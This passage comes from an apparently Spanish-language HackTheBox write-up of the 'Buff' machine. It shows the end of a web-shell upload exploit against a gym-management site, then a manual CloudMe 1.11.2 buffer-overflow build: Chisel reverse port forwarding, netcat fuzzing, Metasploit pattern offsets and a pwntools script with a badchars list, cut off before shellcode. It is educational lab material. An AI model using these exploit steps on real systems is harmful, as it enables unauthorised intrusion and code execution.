</span></span><span class=line><span class=cl>  <span class=mi>10</span>   <span class=err>│</span>     <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=mi>11</span>   <span class=err>│</span>         <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Error al realizar la solicitud:&#34;</span><span class=p>,</span> <span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>12</span>   <span class=err>│</span> 
</span></span><span class=line><span class=cl>  <span class=mi>13</span>   <span class=err>│</span> <span class=n>s</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>  <span class=mi>14</span>   <span class=err>│</span> <span class=n>subir_archivo</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>15</span>   <span class=err>│</span> <span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;http://10.10.10.198:8080/upload/user2.php&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>16</span>   <span class=err>│</span> <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                                                                                                      
</span></span><span class=line><span class=cl><span class=o>&gt;</span> <span class=n>python3</span> <span class=n>exploit</span><span class=o>.</span><span class=n>py</span>
</span></span><span class=line><span class=cl><span class=n>GIF8</span><span class=p>;</span>
</span></span><span class=line><span class=cl> <span class=n>buff</span>\<span class=n>shaun</span>
</span></span></code></pre></div><h2 id=escalada-de-privilegios>Escalada de privilegios<a href=#escalada-de-privilegios class=anchor aria-hidden=true>#</a></h2><p>Dentro del directorio de <code>Downloads</code> hay un archivo llamado <strong>CloudMe_1112.exe</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\s</span>haun&gt;tree /f
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    3D Objects
</span></span><span class=line><span class=cl>    Contacts
</span></span><span class=line><span class=cl>    Desktop
</span></span><span class=line><span class=cl>        user.txt
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>    Documents
</span></span><span class=line><span class=cl>        Tasks.bat
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>    Downloads
</span></span><span class=line><span class=cl>        CloudMe_1112.exe
</span></span><span class=line><span class=cl>....       
</span></span></code></pre></div><p>Con una búsqueda rápida por google se puede encontrar porque puerto funciona por defecto CloudMe (<strong>8888</strong>)</p><p>Con un netstat -a podemos ver que el puerto 8888 está abierto en local</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\x</span>ampp<span class=se>\h</span>tdocs<span class=se>\g</span>ym<span class=se>\u</span>pload&gt;netstat -a
</span></span><span class=line><span class=cl>netstat -a
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Active Connections
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  Proto  Local Address          Foreign Address        State
</span></span><span class=line><span class=cl>  TCP    0.0.0.0:135            BUFF:0                 LISTENING
</span></span><span class=line><span class=cl>  TCP    0.0.0.0:445            BUFF:0                 LISTENING
</span></span><span class=line><span class=cl>  TCP    0.0.0.0:5040           BUFF:0                 LISTENING
</span></span><span class=line><span class=cl>  TCP    0.0.0.0:7680           BUFF:0                 LISTENING
</span></span><span class=line><span class=cl>  TCP    0.0.0.0:8080           BUFF:0                 LISTENING
</span></span><span class=line><span class=cl>  TCP    0.0.0.0:49664          BUFF:0                 LISTENING
</span></span><span class=line><span class=cl>  TCP    0.0.0.0:49665          BUFF:0                 LISTENING
</span></span><span class=line><span class=cl>  TCP    0.0.0.0:49666          BUFF:0                 LISTENING
</span></span><span class=line><span class=cl>  TCP    0.0.0.0:49667          BUFF:0                 LISTENING
</span></span><span class=line><span class=cl>  TCP    0.0.0.0:49668          BUFF:0                 LISTENING
</span></span><span class=line><span class=cl>  TCP    0.0.0.0:49669          BUFF:0                 LISTENING
</span></span><span class=line><span class=cl>  TCP    10.10.10.198:139       BUFF:0                 LISTENING
</span></span><span class=line><span class=cl>  TCP    10.10.10.198:8080      10.10.14.31:55448      ESTABLISHED
</span></span><span class=line><span class=cl>  TCP    10.10.10.198:49771     10.10.14.31:https      ESTABLISHED
</span></span><span class=line><span class=cl>  TCP    127.0.0.1:3306         BUFF:0                 LISTENING
</span></span><span class=line><span class=cl>  TCP    127.0.0.1:8888         BUFF:0                 LISTENING
</span></span></code></pre></div><p>Con un searchsploit encontramos que la versión del programa que había en la carpeta de &lsquo;Downloads&rsquo; es vulnerable a un Buffer Overflow.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; searchsploit CloudMe 1.11.2
</span></span><span class=line><span class=cl>----------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl> Exploit Title                                                               <span class=p>|</span>  Path
</span></span><span class=line><span class=cl>----------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>CloudMe 1.11.2 - Buffer Overflow <span class=o>(</span>PoC<span class=o>)</span>                                       <span class=p>|</span> windows/remote/48389.py
</span></span><span class=line><span class=cl>CloudMe 1.11.2 - Buffer Overflow <span class=o>(</span>SEH_DEP_ASLR<span class=o>)</span>                              <span class=p>|</span> windows/local/48499.txt
</span></span><span class=line><span class=cl>CloudMe 1.11.2 - Buffer Overflow ROP <span class=o>(</span>DEP_ASLR<span class=o>)</span>                              <span class=p>|</span> windows/local/48840.py
</span></span><span class=line><span class=cl>CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                              <span class=p>|</span> windows/remote/46218.py
</span></span><span class=line><span class=cl>CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                              <span class=p>|</span> windows/remote/46218.py
</span></span><span class=line><span class=cl>CloudMe Sync 1.11.2 Buffer Overflow - WoW64 <span class=o>(</span>DEP Bypass<span class=o>)</span>                     <span class=p>|</span> windows_x86-64/remote/46250.py
</span></span><span class=line><span class=cl>CloudMe Sync 1.11.2 Buffer Overflow - WoW64 <span class=o>(</span>DEP Bypass<span class=o>)</span>                     <span class=p>|</span> windows_x86-64/remote/46250.py
</span></span><span class=line><span class=cl>----------------------------------------------------------------------------- ---------------------------------
</span></span></code></pre></div><p>Podríamos usar el script de exploitdb, pero vamos a hacerlo manual.</p><h4 id=buffer-overflow>Buffer Overflow<a href=#buffer-overflow class=anchor aria-hidden=true>#</a></h4><p>Primero de todo vamos a usar una máquina virtual con un windows 7 de 32 Bits, dentro del windows vamos a instalar <a href=https://www.cloudme.com/downloads/CloudMe_1112.exe>CloudMe 1.11.2</a>, <a href=https://www.immunityinc.com/products/debugger/>Immunity Debuger</a> y <a href=https://raw.githubusercontent.com/corelan/mona/master/mona.py>mona.py</a></p><ul><li>El <a href=https://www.immunityinc.com/products/debugger/>Immunity Debuger</a> lo vamos a usar para analizar el binario durante la ejecución.</li><li>El <a href=https://www.cloudme.com/downloads/CloudMe_1112.exe>CloudMe 1.11.2</a> va a estar ejecutándose en nuestra, máquina para poder analizarlo y simular ataques como si fuera la máquina víctima</li><li><a href=https://raw.githubusercontent.com/corelan/mona/master/mona.py>mona.py</a> Mona.py es un script en python que funciona con Immunity Debuger, vamos a usarlo para automatizar distintos procesos durante la explotación del buffer overflow</li></ul><details><summary>Como instalar mona.py en Immunity Debugger</summary><p>Descargamos el archivo de github</p><p>https://raw.githubusercontent.com/corelan/mona/master/mona.py</p><p>Y lo movemos a <code>C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands</code></p></details><br><p>Lo siguiente es ejecutar el CloudMe 1.11.2 para ello necesitamos crear una cuenta de CloudMe.</p><h5 id=portfordwarding>Portfordwarding<a href=#portfordwarding class=anchor aria-hidden=true>#</a></h5><p>Si recordamos CloudMe funciona por el puerto 8888 en local así que no podemos ver este puerto desde el Kali, por lo que tenemos que hacer portforwarding, para ello usamos Chisel</p><p>En la máquina atacante nos descargamos <a href=https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz>Chisel</a> y lo ejecutamos</p><pre tabindex=0><code>sudo ./chisel server --reverse -p 1234
</code></pre><details><summary>Explicación parámetros</summary><table><thead><tr><th style=text-align:center>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td style=text-align:center>-p</td><td>Especificamos el puerto por el cual vamos a tener el servidor chisel</td></tr><tr><td style=text-align:center>server</td><td>Abre chisel en modo servidor</td></tr><tr><td style=text-align:center>&ndash;reverse</td><td>Permite a los clientes configurar reenvíos de puertos inversos</td></tr></tbody></table></details><br><p>En el windows vamos a descargar también <a href=https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_386.gz>Chisel</a> y lo ejecutamos</p><pre tabindex=0><code>chisel.exe client 192.168.1.145:1234 R:8888:127.0.0.1:8888
</code></pre><details><summary>Explicación parámetros</summary><table><thead><tr><th style=text-align:center>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td style=text-align:center>192.168.1.145:1234</td><td>Especificamos la ip de la máquina atacante en la cual tenemos el chisel en modo server y el puerto en el cual tenemos chisel corriendo</td></tr><tr><td style=text-align:center>client</td><td>Abre chisel en modo cliente</td></tr><tr><td style=text-align:center>R:8888:127.0.0.1:8888</td><td>Indicamos que el puerto 8888 de la máquina Windows se mapee al puerto 8888 de la máquina atacante. Lo que significa que ahora el puerto 8888 de la máquina atacante es el mismo que el 8888 de la máquina Windows</td></tr></tbody></table></details><br><p>Para comprobar que ha funcionado todo correcto podemos comprobar si el puerto 8888 se ha abierto en nuestro kali, de la siguiente forma:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ss -tnlp <span class=p>|</span> grep <span class=m>8888</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>LISTEN <span class=m>0</span>      <span class=m>4096</span>               *:8888             *:*
</span></span></code></pre></div><details><summary>Explicación parámetros</summary><table><thead><tr><th style=text-align:center>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td style=text-align:center>ss</td><td>Se usa para mostrar información sobre los sockets de red, como conexiones TCP, UDP y estadísticas de socket</td></tr><tr><td style=text-align:center>-t</td><td>Muestra únicamente las conexiones TCP.</td></tr><tr><td style=text-align:center>-n</td><td>Muestra las direcciones y puertos numéricamente en lugar de resolver nombres.</td></tr><tr><td style=text-align:center>-l</td><td>Muestra solo las conexiones en estado de escucha (listening).</td></tr><tr><td style=text-align:center>-p</td><td>Muestra los procesos asociados con los sockets.</td></tr><tr><td style=text-align:center>grep</td><td>En este caso lo usamos para filtrar por la línea que contenga el puerto 8888</td></tr></tbody></table></details><br><h5 id=calcular-offset>Calcular Offset<a href=#calcular-offset class=anchor aria-hidden=true>#</a></h5><p>Empezamos mandando muchos caracteres para ver si la aplicación deja de funcionar</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>python2</span> <span class=o>-</span><span class=n>c</span> <span class=s1>&#39;print &#34;A&#34;*7000&#39;</span> <span class=o>|</span> <span class=n>nc</span> <span class=mf>127.0.0.1</span> <span class=mi>8888</span>
</span></span></code></pre></div><p>Ahora en el windows aparece el siguiente mensaje</p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/hackthebox/buff/images/error_hu06a20d1293acbfc116460f2392a6acf6_13719_6407e935e45fe3e1528a591252b07b1c.webp 480w, /writeups/hackthebox/buff/images/error_hu06a20d1293acbfc116460f2392a6acf6_13719_04629c4073923a94a7925e11b81d0441.webp 640w, /writeups/hackthebox/buff/images/error_hu06a20d1293acbfc116460f2392a6acf6_13719_ae5159e2621af885ef759c32a609a538.webp 800w, /writeups/hackthebox/buff/images/error_hu06a20d1293acbfc116460f2392a6acf6_13719_bfac158c2dd27a5c9dbede109b6741b2.webp 1024w" fetchpriority=low height=900 id=h-rh-i-0 src=/writeups/hackthebox/buff/images/error_hu06a20d1293acbfc116460f2392a6acf6_13719_125f15511317efe499d7da40f915e6d0.webp width=1600></p><p>Para saber por qué crashea vamos a abrirlo otra vez y hacer un attach (File>Attach>CloudMe) desde Immunity Debugger, y le damos al play</p><p>Repetimos el mismo proceso de mandar un input grande</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>python2</span> <span class=o>-</span><span class=n>c</span> <span class=s1>&#39;print &#34;A&#34;*7000&#39;</span> <span class=o>|</span> <span class=n>nc</span> <span class=mf>127.0.0.1</span> <span class=mi>8888</span>
</span></span></code></pre></div><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/hackthebox/buff/images/1_huc101e4779d15d434bcba6879aba4d29f_10131_939506192ef1dddfdd6e2c556c2582a3.webp 480w, /writeups/hackthebox/buff/images/1_huc101e4779d15d434bcba6879aba4d29f_10131_a7f84cf8da083cc5ebe2693b4705da50.webp 640w, /writeups/hackthebox/buff/images/1_huc101e4779d15d434bcba6879aba4d29f_10131_c5859592cad7cb519d200e6c359ef32f.webp 800w, /writeups/hackthebox/buff/images/1_huc101e4779d15d434bcba6879aba4d29f_10131_42ac71aee0bbac0ad2b07e82a0d51a72.webp 1024w" fetchpriority=low height=900 id=h-rh-i-1 src=/writeups/hackthebox/buff/images/1_huc101e4779d15d434bcba6879aba4d29f_10131_7c3f4e999e78062de8559f7c0af07668.webp width=1600></p><p>Ahora desde immunity debugger podemos ver que hay registros como el EIP,ESP,EBP,&mldr; que tienen de valor <strong>41</strong>, el 41 es el resultado del carácter &lsquo;A&rsquo; en hexadecimal, esto significa que al poner una cadena más larga que el tamaño de buffer que tenía asignada la variable, se han sobreescrito registros de la memoria para poder guardar las &lsquo;A&rsquo;. El problema está en que por ejemplo si cambiamos el valor del EIP el programa no sabe por donde continuar, ya que el EIP &ldquo;Instruction Pointer&rdquo; (Puntero de Instrucción) contiene la dirección de la memoria de la próxima instrucción, si le ponemos una dirección que no existe como en este caso 41414141, simplemente deja de funcionar.</p><p>Vamos a ver cuantas <strong>A</strong> tenemos que poner para llegar hasta el EIP, para ello vamos a crear una cadena especialmente diseñada para esto</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <span class=m>7000</span>
</span></span><span class=line><span class=cl>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3A...
</span></span></code></pre></div><details><summary>Explicación parámetros</summary><table><thead><tr><th style=text-align:center>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td style=text-align:center>-l 7000</td><td>Especificamos la cantidad de caracteres que va a tener la cadena</td></tr></tbody></table></details><br><p>Se lo mandamos a CloudMe</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; nc 127.0.0.1 <span class=m>8888</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1A...
</span></span></code></pre></div><p>Obviamente, CloudMe se ha vuelto a petar, pero si observamos el EIP, vemos que ahora vale <strong>316A4230</strong>.</p><p>Con el siguiente comando se calcula automáticamente el offset (La cantidad de &lsquo;A&rsquo;) para llegar al EIP</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <span class=m>7000</span> -q 316A4230
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Exact match at offset <span class=m>1052</span>
</span></span></code></pre></div><details><summary>Explicación parámetros</summary><table><thead><tr><th style=text-align:center>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td style=text-align:center>-l 7000</td><td>Especificamos la cantidad de caracteres que tenía la cadena</td></tr><tr><td style=text-align:center>-q 316A4230</td><td>Con -q ponemos los caracteres que salen en el EIP</td></tr></tbody></table></details><br><p>El comando nos dice que el offset es 1052.</p><p>Para comprobarlo mandaremos 1052 &lsquo;A&rsquo; y 4 &lsquo;B&rsquo;, si el cálculo ha salido bien deberíamos ver desde immunity debugger que el eip vale 42424242 que es BBBB en hexadecimal</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python2 -c <span class=s1>&#39;print &#34;A&#34;*1052 + &#34;B&#34;*4&#39;</span> <span class=p>|</span> nc 127.0.0.1 <span class=m>8888</span>
</span></span></code></pre></div><p>Efectivamente, después de ejecutar esto el EIP pasa a valer 42424242 que es lo mismo que BBBB, esto sígnica que ya tenemos el control del EIP y por ende el control del flujo del programa.</p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/hackthebox/buff/images/eip2_hu8333a745ca9ee34200e7b7fbf5911242_7635_881e4e416e6cde5121397e815d3fe235.webp 480w, /writeups/hackthebox/buff/images/eip2_hu8333a745ca9ee34200e7b7fbf5911242_7635_4f80f771395e007ba702ba16086facce.webp 640w, /writeups/hackthebox/buff/images/eip2_hu8333a745ca9ee34200e7b7fbf5911242_7635_95530b22643717ee99cbcdb91b4f7812.webp 800w, /writeups/hackthebox/buff/images/eip2_hu8333a745ca9ee34200e7b7fbf5911242_7635_d748b18764dda95d7a12bb950db6d519.webp 1024w" fetchpriority=low height=900 id=h-rh-i-2 src=/writeups/hackthebox/buff/images/eip2_hu8333a745ca9ee34200e7b7fbf5911242_7635_4d83f8f1dec8efbe651e7f9e5a53d87c.webp width=1600></p><p>Esto lo vamos a usar para modificar el EIP para que salte al ESP y dentro del ESP vamos a cargar unas instrucciones para ejecutar comandos.</p><p>Mandamos el mismo payload que antes, pero ahora con 2000 C que van a representar las intrucciones que pondremos más tarde.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python2 -c <span class=s1>&#39;print &#34;A&#34;*1052 + &#34;B&#34;*4 + &#34;C&#34;*200&#39;</span> <span class=p>|</span> nc 127.0.0.1 <span class=m>8888</span>
</span></span></code></pre></div><p>Desde el Immunity Debugger vemos que el ESP comienza justo después del EIP.</p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/hackthebox/buff/images/bof3_hu447b4c3e36bff42d4018c264998c1077_8292_e3c1c9f6279dff13d2050a0974f0c163.webp 480w, /writeups/hackthebox/buff/images/bof3_hu447b4c3e36bff42d4018c264998c1077_8292_3615eae81119045f4a7b74f80f595911.webp 640w, /writeups/hackthebox/buff/images/bof3_hu447b4c3e36bff42d4018c264998c1077_8292_ee9c42da717d072e04f76941682dd374.webp 800w, /writeups/hackthebox/buff/images/bof3_hu447b4c3e36bff42d4018c264998c1077_8292_fe08c4332b950f37cb9abe5c9d273aea.webp 1024w" fetchpriority=low height=900 id=h-rh-i-3 src=/writeups/hackthebox/buff/images/bof3_hu447b4c3e36bff42d4018c264998c1077_8292_b4a16aaaac1836487a643bd323968f6c.webp width=1600></p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/hackthebox/buff/images/bof4_hu12cddd9f38c0a49110176c1db4f7f435_10397_7c632badcc3eeffb49fe509f2a7e2102.webp 480w, /writeups/hackthebox/buff/images/bof4_hu12cddd9f38c0a49110176c1db4f7f435_10397_49c87bebeddce2f52a6c125cff2cbfdf.webp 640w, /writeups/hackthebox/buff/images/bof4_hu12cddd9f38c0a49110176c1db4f7f435_10397_7bfe510cf0f84607bafd480bfb3058b6.webp 800w, /writeups/hackthebox/buff/images/bof4_hu12cddd9f38c0a49110176c1db4f7f435_10397_44dec07d34e74ef8533e2a32d319c225.webp 1024w" fetchpriority=low height=900 id=h-rh-i-4 src=/writeups/hackthebox/buff/images/bof4_hu12cddd9f38c0a49110176c1db4f7f435_10397_a44672206ecb81a13435a7a79a1c8ac0.webp width=1600></p><h5 id=badchars>Badchars<a href=#badchars class=anchor aria-hidden=true>#</a></h5><p>¿Qué es un badchar?</p><blockquote><p>Un &ldquo;badchar&rdquo; es un carácter que, cuando se procesa, puede causar problemas porque el sistema no lo interpreta de la manera esperada.</p></blockquote><p>¿Como podríamos comprobar si hay algún carácter que no se procesa bien?, pues mandando todos los tipos de caracteres y ver si dan errores.</p><p>Hasta ahora hemos estado mandando onelines de python, pero ahora vamos a hacer un script porque vamos a tener que añadir más cosas</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>struct</span> <span class=kn>import</span> <span class=n>pack</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=mi>1052</span>
</span></span><span class=line><span class=cl><span class=n>before_eip</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=n>offset</span>
</span></span><span class=line><span class=cl><span class=n>eip</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;BBBB&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>before_eip</span> <span class=o>+</span> <span class=n>eip</span> 
</span></span><span class=line><span class=cl><span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=mi>8888</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><p>A este script le tenemos que añadir los caracteres que comprobaremos si son badchars. Para sacar la lista usaremos el programa badchars que lo podemos instalar con pip</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; pip3 install badchars
</span></span><span class=line><span class=cl>                                                                                                        
</span></span><span class=line><span class=cl>&gt; badchars -f python
</span></span><span class=line><span class=cl><span class=nv>badchars</span> <span class=o>=</span> <span class=o>(</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&#34;</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&#34;</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&#34;</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&#34;</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&#34;</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&#34;</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&#34;</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&#34;</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&#34;</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&#34;</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&#34;</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&#34;</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&#34;</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&#34;</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&#34;</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#34;</span>
</span></span><span class=line><span class=cl><span class=o>)</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>struct</span> <span class=kn>import</span> <span class=n>pack</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=mi>1052</span>
</span></span><span class=line><span class=cl><span class=n>before_eip</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=n>offset</span>
</span></span><span class=line><span class=cl><span class=n>eip</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;BBBB&#34;</span>
</span></span><span class=line><span class=cl><span class=n>badchars</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>  <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>  <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>  <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>  <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>  <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>  <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>  <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>  <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>  <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>  <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>  <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0</span><span class=s2>&#34;</span>
